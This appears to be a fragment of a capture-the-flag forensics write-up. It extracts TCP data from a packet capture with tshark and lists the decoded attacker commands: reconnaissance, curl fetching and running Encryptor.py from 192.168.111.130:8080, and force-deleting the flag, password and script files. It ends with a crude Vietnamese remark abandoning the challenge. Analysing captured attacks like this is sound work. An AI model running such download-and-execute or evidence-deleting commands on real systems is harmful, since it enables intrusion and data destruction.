tshark -r Capture.pcapng -Y "ip.addr == 192.168.111.130 && data && tcp && data.len < 1000" -T fields -e data

```bash
$ python tcp_dec.py tcp_data.txt
[01] whoami
[02] cd
[03] dir
[04] echo ](leZd*PkwSY%D3a,fUQ > password.txt
[05] curl http://192.168.111.130:8080/Encryptor.py
[06] curl http://192.168.111.130:8080/Encryptor.py --output Encryptor.py
[07] python Encryptor.py
[08] del /f IPC_Flag.png
[09] del /f password.txt
[10] del /f Encryptor.py
[11] exit
```

# Bài xàm buồi ko làm nữa
